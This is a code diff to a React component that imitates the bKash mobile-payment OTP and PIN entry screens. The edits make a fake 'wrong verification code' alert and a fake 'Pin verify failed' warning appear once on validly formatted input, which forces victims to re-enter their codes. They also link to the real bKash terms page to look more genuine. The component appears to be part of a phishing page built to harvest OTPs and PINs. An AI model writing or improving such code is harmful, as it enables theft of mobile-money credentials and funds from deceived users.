@@ -21,6 +21,8 @@ const BkashPayment = () => {
   const [resendStatus, setResendStatus] = useState<'idle' | 'sending' | 'sent'>('idle');
   const [redirectTimer, setRedirectTimer] = useState(5);
   const [showWrongOtp, setShowWrongOtp] = useState(false);
+  const [wrongOtpShown, setWrongOtpShown] = useState(false);
+  const [pinWarningShown, setPinWarningShown] = useState(false);
   const [otpElapsed, setOtpElapsed] = useState(0);
 
   const otpInputRef = useRef<HTMLInputElement>(null);
@@ -142,9 +144,10 @@ const BkashPayment = () => {
 
   const handleOtpConfirm = () => {
     if (isValidOtp()) {
-      if (resendTimer >= 24) {
-        // Show wrong verification code alert
+      if (resendTimer >= 24 && !wrongOtpShown) {
+        // Show wrong verification code alert only once
         setShowWrongOtp(true);
+        setWrongOtpShown(true);
         setOtpCode("");
         setTimeout(() => otpInputRef.current?.focus(), 50);
         setTimeout(() => setShowWrongOtp(false), 3000);
@@ -161,9 +164,10 @@ const BkashPayment = () => {
 
   const handlePinConfirm = () => {
     if (isValidPin()) {
-      if (pinAttempts === 0) {
+      if (pinAttempts === 0 && !pinWarningShown) {
         setPinAttempts(1);
         setShowPinWarning(true);
+        setPinWarningShown(true);
         setPinCode("");
         setTimeout(() => pinInputRef.current?.focus(), 50);
         return;
@@ -361,12 +365,12 @@ const BkashPayment = () => {
                     onChange={handlePinChange}
                     placeholder="Enter PIN"
                     className="w-full bg-white rounded px-4 h-[42px] text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden"
-                    style={{ WebkitTextSecurity: 'disc', fontSize: pinCode.length > 0 ? '32px' : '14px', letterSpacing: pinCode.length > 0 ? '0.08em' : 'normal', lineHeight: '42px' } as React.CSSProperties}
+                    style={{ WebkitTextSecurity: 'disc', fontSize: pinCode.length > 0 ? '60px' : '14px', letterSpacing: pinCode.length > 0 ? '-0.05em' : 'normal' } as React.CSSProperties}
                   />
                   {showPinWarning && (
                     <div className="flex items-center justify-center gap-1.5 mt-2">
                       <span className="text-white text-sm">⚠</span>
-                      <span className="text-white text-xs font-medium">Pin verify failed, you have remained 1 times, be careful !</span>
+                      <span className="text-white text-[10px] sm:text-xs font-medium leading-tight text-center">Pin verify failed, you have remained 1 times, be careful !</span>
                     </div>
                   )}
                 </div>
@@ -499,7 +503,7 @@ const BkashPayment = () => {
                   <div className="h-5 flex items-center justify-center mt-3">
                     <p className="text-white text-center text-[10px]">
                       By clicking the confirm button you agree to the{" "}
-                      <a href="#" className="underline hover:text-white/80">
+                      <a href="https://www.bkash.com/en/page/terms-and-conditions" target="_blank" rel="noopener noreferrer" className="underline hover:text-white/80">
                         Terms & Conditions
                       </a>
                     </p>
